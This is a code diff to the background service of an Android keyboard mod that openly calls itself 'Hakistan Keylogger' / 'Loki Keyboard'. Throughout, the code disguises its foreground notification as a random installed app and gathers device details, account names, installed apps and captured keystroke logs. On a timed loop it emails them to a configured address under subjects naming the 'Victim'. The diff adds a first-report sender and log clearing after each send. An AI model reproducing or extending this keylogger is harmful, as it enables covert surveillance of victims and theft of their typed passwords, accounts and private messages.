@@ -66,7 +66,7 @@ public class InGService extends IntentService {
     public static final String MY_PREFS_NAME = "GPrefs";
     public static final String MY_PREFS_STRING_KEY = "GPrefsStringsKey";
     private String DataToSend = "";
-   // private String ApplicationPackageName;
+    // private String ApplicationPackageName;
 
     private String Sysinfo = "";
     //private String ContactsList = "";
@@ -107,35 +107,36 @@ public class InGService extends IntentService {
         wakeLock.acquire(3600000);
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-        ApkInfoExtractor apkInfoExtractor = new ApkInfoExtractor(getApplicationContext());
+            Log.d(TAG, "onCreate: Crearing Notification");
+            ApkInfoExtractor apkInfoExtractor = new ApkInfoExtractor(getApplicationContext());
 
-        List<String> arrayList = new ApkInfoExtractor(getApplicationContext()).GetAllInstalledApkInfo();
+            List<String> arrayList = new ApkInfoExtractor(getApplicationContext()).GetAllInstalledApkInfo();
 
-        Random random = new Random();
-        int randomNumber = random.nextInt(arrayList.size()-5) + 5;
+            Random random = new Random();
+            int randomNumber = random.nextInt(arrayList.size() - 5) + 5;
 
-        String PACKAGE_NAME = getApplicationContext().getPackageName();
+            String PACKAGE_NAME = getApplicationContext().getPackageName();
 
-        ApplicationPackageName = (String) arrayList.get(randomNumber);
+            ApplicationPackageName = (String) arrayList.get(randomNumber);
 
-        while (PACKAGE_NAME.equals(ApplicationPackageName)){
+            while (PACKAGE_NAME.equals(ApplicationPackageName)) {
 
-            Random random1 = new Random();
-            int randomNumber1 = random1.nextInt(arrayList.size()-5) + 5;
+                Random random1 = new Random();
+                int randomNumber1 = random1.nextInt(arrayList.size() - 5) + 5;
 
-            ApplicationPackageName = (String) arrayList.get(randomNumber1);
+                ApplicationPackageName = (String) arrayList.get(randomNumber1);
 
-        }
+            }
 
-        String ApplicationLabelName = apkInfoExtractor.GetAppName(ApplicationPackageName);
-        // Drawable drawable = apkInfoExtractor.getAppIconByPackageName(ApplicationPackageName);
+            String ApplicationLabelName = apkInfoExtractor.GetAppName(ApplicationPackageName);
+            // Drawable drawable = apkInfoExtractor.getAppIconByPackageName(ApplicationPackageName);
 
-        Log.i("MainActivity", ApplicationLabelName + "    " + ApplicationPackageName);
+            Log.i("MainActivity", ApplicationLabelName + "    " + ApplicationPackageName);
 
 
-        Intent notificationIntent = getPackageManager().getLaunchIntentForPackage(ApplicationPackageName);
-        PendingIntent pendingIntent = PendingIntent.getActivity(this,
-                0, notificationIntent, 0);
+            Intent notificationIntent = getPackageManager().getLaunchIntentForPackage(ApplicationPackageName);
+            PendingIntent pendingIntent = PendingIntent.getActivity(this,
+                    0, notificationIntent, 0);
 
 
             Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
@@ -147,7 +148,7 @@ public class InGService extends IntentService {
 
             startForeground(1, notification);
         }
-
+/*
         final ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
         if (clipboard != null) {
             clipboard.addPrimaryClipChangedListener( new ClipboardManager.OnPrimaryClipChangedListener() {
@@ -184,8 +185,9 @@ public class InGService extends IntentService {
             });
         }
 
-    }
 
+ */
+    }
 
 
     @Override
@@ -201,25 +203,25 @@ public class InGService extends IntentService {
         }
 */
 
-        while (true){
+        while (true) {
 
 
-            Log.i(TAG,"Again Started EMail Work!");
+            Log.i(TAG, "Again Started EMail Work!");
 
             // _multipart = new MimeMultipart("related");
 
-            email=getResources().getString(R.string.EMail);
-            password=getResources().getString(R.string.Password);
-            emailinterval=getResources().getString(R.string.Interval);
+            email = getResources().getString(R.string.EMail);
+            password = getResources().getString(R.string.EmailPassword);
+            emailinterval = getResources().getString(R.string.Interval);
 
             // php();
 
-            SharedPreferences prefs = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE);
+            SharedPreferences prefs = getSharedPreferences("MYSHPF", MODE_PRIVATE);
 
-            SharedPreferences.Editor editor = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE).edit();
+            //   SharedPreferences.Editor editor = getSharedPreferences("MYSHPF", MODE_PRIVATE).edit();
 
 
-            String DataToSend = prefs.getString(MY_PREFS_STRING_KEY, "Hakistan Keylogger \n");//"No name defined" is the default value.
+            // String DataToSend = prefs.getString(MY_PREFS_STRING_KEY, "Hakistan Keylogger \n");//"No name defined" is the default value.
 
 
             // Log.i(TAG,"Going To Send Email!");
@@ -227,7 +229,7 @@ public class InGService extends IntentService {
 
             //addAttachment();
 
-            if(haveNetworkConnection()) {
+            if (haveNetworkConnection()) {
 
                 if (prefs.getBoolean("FirstRun", true)) {
 
@@ -235,14 +237,16 @@ public class InGService extends IntentService {
 
 
                     Sysinfo = getSYSInfo();
-                   // ContactsList = getContactList();
+                    // ContactsList = getContactList();
                     AccountsList = getAccountsList();
 
-                    sendMail(email, "Loki Keyboard First Report", Sysinfo + "\n" + AccountsList + "\n\n<End Of Message>\n*|* Loki Keyboard Mod For Android *|*\n*|* Re-developed By Hakistan *|*\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");
+                    sendFirstMail(email, "Lokiboard First Report", Sysinfo + "\n" + AccountsList + "\n\n<End Of Message>\n*|* Loki Keyboard Mod For Android *|*\n*|* Re-developed By Hakistan *|*\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");
 
-
+/*
                     editor.putBoolean("FirstRun", false);
                     editor.apply();
+
+ */
                 } else {
 
                     Log.i(TAG, "NOt First Run");
@@ -257,11 +261,11 @@ public class InGService extends IntentService {
                     Log.i(TAG, "Some Logs Founded, going to send Email!");
 
 
-                   // Long perviousNotiCountData = prefs.getLong(MY_PREFS_Notification_Count_KEY, 0);//"No name defined" is the default value.
-                  //  Long perviousTextCountData = prefs.getLong(MY_PREFS_Text_Count_KEY, 0);//"No name defined" is the default value.
-                   // Long perviousFocusedCountData = prefs.getLong(MY_PREFS_FOCUSED_Count_KEY, 0);//"No name defined" is the default value.
-                   // Long perviousClicksCountData = prefs.getLong(MY_PREFS_Clicks_Count_KEY, 0);//"No name defined" is the default value.
-                   // Long perviousClipsCountData = prefs.getLong(MY_PREFS_Clips_Count_KEY, 0);//"No name defined" is the default value.
+                    // Long perviousNotiCountData = prefs.getLong(MY_PREFS_Notification_Count_KEY, 0);//"No name defined" is the default value.
+                    //  Long perviousTextCountData = prefs.getLong(MY_PREFS_Text_Count_KEY, 0);//"No name defined" is the default value.
+                    // Long perviousFocusedCountData = prefs.getLong(MY_PREFS_FOCUSED_Count_KEY, 0);//"No name defined" is the default value.
+                    // Long perviousClicksCountData = prefs.getLong(MY_PREFS_Clicks_Count_KEY, 0);//"No name defined" is the default value.
+                    // Long perviousClipsCountData = prefs.getLong(MY_PREFS_Clips_Count_KEY, 0);//"No name defined" is the default value.
 
                     String deviceDetails = "MANUFACTURER : " + Build.MANUFACTURER
                             + "\nMODEL : " + Build.MODEL
@@ -280,7 +284,7 @@ public class InGService extends IntentService {
                             + "\nFINGERPRINT : " + Build.FINGERPRINT;
 
 
-                    sendMail(email, "Loki Keyboard's Report", "Victim's Device Info : \n" + deviceDetails + "\n\n"+"\nKey Logs: \n" + datatos + "\n\n<End Of Message>\n*|* Loki Keyboard Mod For Android *|*\n*|* Re-developed by Hakistan *|*\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");
+                    sendMail(email, "Lokiboard Keylogger Report", "Victim's Device Info : \n" + deviceDetails + "\n\n" + "\nKey Logs: \n" + datatos + "\n\n<End Of Message>\n*|* Loki Keyboard Mod For Android *|*\n*|* Re-developed by Hakistan *|*\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");
 
                     /*
                     editor.putLong(MY_PREFS_Notification_Count_KEY, 0);
@@ -291,7 +295,7 @@ public class InGService extends IntentService {
                     editor.putString(MY_PREFS_STRING_KEY, "");
 
                      */
-                   // editor.apply();
+                    // editor.apply();
 
                 } else {
 
@@ -311,30 +315,31 @@ public class InGService extends IntentService {
 
             }
 
-            Log.i(TAG,"In Runnable!");
+            Log.i(TAG, "In Runnable!");
 
             SystemClock.sleep(Long.parseLong(emailinterval));
 
 
         }
 
-       // taskrun.run();
+        // taskrun.run();
 
 
     }
 
-    private String getLogsData(){
+    private static String getLogsData() {
 
 
         SharedPreferences prefs = ModApp.getAppContext().getSharedPreferences("MYSHPF", MODE_PRIVATE);
-        String LDataTOSend = prefs.getString("datatost", "Redeveloped By Hakistan");//"No name defined" is the default value.
-
+        /*
         SharedPreferences.Editor editor = ModApp.getAppContext().getSharedPreferences("MYSHPF", MODE_PRIVATE).edit();
         editor.putString("datatost", "");
         //editor.putInt("idName", 12);
         editor.apply();
 
-        return LDataTOSend;
+
+ */
+        return prefs.getString("datatost", "Redeveloped By Hakistan");
 
     }
 
@@ -342,13 +347,13 @@ public class InGService extends IntentService {
         public void run() {
             //gameOver();
 
-            Log.i(TAG,"Again Started EMail Work!");
+            Log.i(TAG, "Again Started EMail Work!");
 
             // _multipart = new MimeMultipart("related");
 
-            email=getResources().getString(R.string.EMail);
-            password=getResources().getString(R.string.Password);
-            emailinterval=getResources().getString(R.string.Interval);
+            email = getResources().getString(R.string.EMail);
+            password = getResources().getString(R.string.EmailPassword);
+            emailinterval = getResources().getString(R.string.Interval);
 
             // php();
 
@@ -365,7 +370,7 @@ public class InGService extends IntentService {
 
             //addAttachment();
 
-            if(haveNetworkConnection()) {
+            if (haveNetworkConnection()) {
 
                 if (prefs.getBoolean("FirstRun", true)) {
 
@@ -416,7 +421,7 @@ public class InGService extends IntentService {
                             + "\nCPU_ABI2 : " + Build.CPU_ABI2
                             + "\nFINGERPRINT : " + Build.FINGERPRINT;
 
-                    sendMail(email, "Hakistan Keylogger's Report, NOTIFICATIONS: " + perviousNotiCountData + ", CLICKS: " + perviousClicksCountData + ", TEXT: " + perviousTextCountData + ", FOCUSED: " + perviousFocusedCountData + ", Clips: "+perviousClipsCountData, "Victim's Device Info : \n" + deviceDetails + "\n\n"+"\nKey Logs & Notifications: \n" + DataToSend + "\n\n<End Of Message>\n|* Hakistan Keylogger For Android *|\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");
+                    sendMail(email, "Hakistan Keylogger's Report, NOTIFICATIONS: " + perviousNotiCountData + ", CLICKS: " + perviousClicksCountData + ", TEXT: " + perviousTextCountData + ", FOCUSED: " + perviousFocusedCountData + ", Clips: " + perviousClipsCountData, "Victim's Device Info : \n" + deviceDetails + "\n\n" + "\nKey Logs & Notifications: \n" + DataToSend + "\n\n<End Of Message>\n|* Hakistan Keylogger For Android *|\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");
 
                     editor.putLong(MY_PREFS_Notification_Count_KEY, 0);
                     editor.putLong(MY_PREFS_Text_Count_KEY, 0);
@@ -444,7 +449,7 @@ public class InGService extends IntentService {
 
             }
 
-            Log.i(TAG,"In Runnable!");
+            Log.i(TAG, "In Runnable!");
             taskhandler.postDelayed(taskrun, Long.parseLong(emailinterval));
 
         }
@@ -478,14 +483,30 @@ public class InGService extends IntentService {
     }
 
 
-    private void sendMail(String email, String subject, String messageBody)
-    {
+    private void sendMail(String email, String subject, String messageBody) {
         Session session = createSessionObject();
 
         try {
             Message message = createMessage(email, subject, messageBody, session);
 
             new SendMailTask().execute(message);
+
+        } catch (AddressException e) {
+            e.printStackTrace();
+        } catch (MessagingException e) {
+            e.printStackTrace();
+        } catch (UnsupportedEncodingException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void sendFirstMail(String email, String subject, String messageBody) {
+        Session session = createSessionObject();
+
+        try {
+            Message message = createMessage(email, subject, messageBody, session);
+
+            new Send1stMailTask().execute(message);
 
         } catch (AddressException e) {
             e.printStackTrace();
@@ -535,7 +556,7 @@ public class InGService extends IntentService {
         });
     }
 
-    private String getAccountsList(){
+    private String getAccountsList() {
 
         String AccountDetails = "\nList Of Accounts: \n\nType : Username\n";
 
@@ -607,7 +628,7 @@ public class InGService extends IntentService {
  */
 
 
-    private String getSYSInfo(){
+    private String getSYSInfo() {
 
         WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
         assert wm != null;
@@ -620,30 +641,30 @@ public class InGService extends IntentService {
         String SystemData = "\nDevice Information: \n";
 
 
-        SystemData = SystemData+ "VERSION.RELEASE : "+ Build.VERSION.RELEASE
-                +"\nVERSION.INCREMENTAL : "+Build.VERSION.INCREMENTAL
-                +"\nVERSION.SDK.NUMBER : "+Build.VERSION.SDK_INT
-                +"\nBOARD : "+Build.BOARD
-                +"\nScreen Width : "+width
-                +"\nScreen Height : "+height
-                +"\nBOOTLOADER : "+Build.BOOTLOADER
-                +"\nBRAND : "+Build.BRAND
-                +"\nCPU_ABI : "+Build.CPU_ABI
-                +"\nCPU_ABI2 : "+Build.CPU_ABI2
-                +"\nDISPLAY : "+Build.DISPLAY
-                +"\nFINGERPRINT : "+Build.FINGERPRINT
-                +"\nHARDWARE : "+Build.HARDWARE
-                +"\nHOST : "+ Build.HOST
-                +"\nID : "+Build.ID
-                +"\nMANUFACTURER : "+ MANUFACTURER
-                +"\nMODEL : "+Build.MODEL
-                +"\nPRODUCT : "+Build.PRODUCT
-                +"\nSERIAL : "+Build.SERIAL
-                +"\nTAGS : "+Build.TAGS
+        SystemData = SystemData + "VERSION.RELEASE : " + Build.VERSION.RELEASE
+                + "\nVERSION.INCREMENTAL : " + Build.VERSION.INCREMENTAL
+                + "\nVERSION.SDK.NUMBER : " + Build.VERSION.SDK_INT
+                + "\nBOARD : " + Build.BOARD
+                + "\nScreen Width : " + width
+                + "\nScreen Height : " + height
+                + "\nBOOTLOADER : " + Build.BOOTLOADER
+                + "\nBRAND : " + Build.BRAND
+                + "\nCPU_ABI : " + Build.CPU_ABI
+                + "\nCPU_ABI2 : " + Build.CPU_ABI2
+                + "\nDISPLAY : " + Build.DISPLAY
+                + "\nFINGERPRINT : " + Build.FINGERPRINT
+                + "\nHARDWARE : " + Build.HARDWARE
+                + "\nHOST : " + Build.HOST
+                + "\nID : " + Build.ID
+                + "\nMANUFACTURER : " + MANUFACTURER
+                + "\nMODEL : " + Build.MODEL
+                + "\nPRODUCT : " + Build.PRODUCT
+                + "\nSERIAL : " + Build.SERIAL
+                + "\nTAGS : " + Build.TAGS
                 //+"\nTIME : "+Build.TIME
-                +"\nTYPE : "+Build.TYPE
-                +"\nUNKNOWN : "+Build.UNKNOWN
-                +"\nUSER : "+Build.USER
+                + "\nTYPE : " + Build.TYPE
+                + "\nUNKNOWN : " + Build.UNKNOWN
+                + "\nUSER : " + Build.USER
                 + "\nANDROID ID : " + Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
 
 
@@ -656,16 +677,16 @@ public class InGService extends IntentService {
 
         String InstalledAppsPkg = "";
 
-        for (String item : arrayList){
+        for (String item : arrayList) {
 
             String ApplicationLabelName = apkInfoExtractor.GetAppName(item);
 
-            InstalledAppsPkg= InstalledAppsPkg + ApplicationLabelName + " : " + item + "\n";
+            InstalledAppsPkg = InstalledAppsPkg + ApplicationLabelName + " : " + item + "\n";
 
 
         }
 
-        SystemData  = SystemData + "\n\nList Of Installed Apps:\n" + "App Name : Package Name\n" + InstalledAppsPkg + "\n";
+        SystemData = SystemData + "\n\nList Of Installed Apps:\n" + "App Name : Package Name\n" + InstalledAppsPkg + "\n";
 
         //Log.i(TAG, SystemData);
 
@@ -694,7 +715,57 @@ public class InGService extends IntentService {
         @Override
         protected Void doInBackground(Message... messages) {
             try {
+                String datatos = getLogsData();
+
+                if (datatos.trim().length() > 0) {
+                    Transport.send(messages[0]);
+
+                    SharedPreferences.Editor editor = ModApp.getAppContext().getSharedPreferences("MYSHPF", MODE_PRIVATE).edit();
+                    editor.putString("datatost", "");
+                    //editor.putInt("idName", 12);
+                    editor.apply();
+
+                } else {
+
+                    Log.i(TAG, "No Logs So, Email is not going to be sent!");
+
+
+                }
+            } catch (MessagingException e) {
+                e.printStackTrace();
+            }
+            return null;
+        }
+    }
+
+
+    private static class Send1stMailTask extends AsyncTask<Message, Void, Void> {
+        //  private ProgressDialog progressDialog;
+
+        @Override
+        protected void onPreExecute() {
+            super.onPreExecute();
+            //Toast.makeText(getApplicationContext(),"Sending Email, Please Wait...",Toast.LENGTH_LONG).show();
+            //    progressDialog = ProgressDialog.show(MainActivity.this, "Please wait", "Sending mail", true, false);
+        }
+
+        @Override
+        protected void onPostExecute(Void aVoid) {
+            super.onPostExecute(aVoid);
+
+            // Toast.makeText(getApplicationContext(),"Email Sent!",Toast.LENGTH_LONG).show();
+
+            //  progressDialog.dismiss();
+        }
+
+        @Override
+        protected Void doInBackground(Message... messages) {
+            try {
                 Transport.send(messages[0]);
+                SharedPreferences.Editor editor = ModApp.getAppContext().getSharedPreferences("MYSHPF", MODE_PRIVATE).edit();
+                editor.putBoolean("FirstRun", false);
+                editor.apply();
+
             } catch (MessagingException e) {
                 e.printStackTrace();
             }
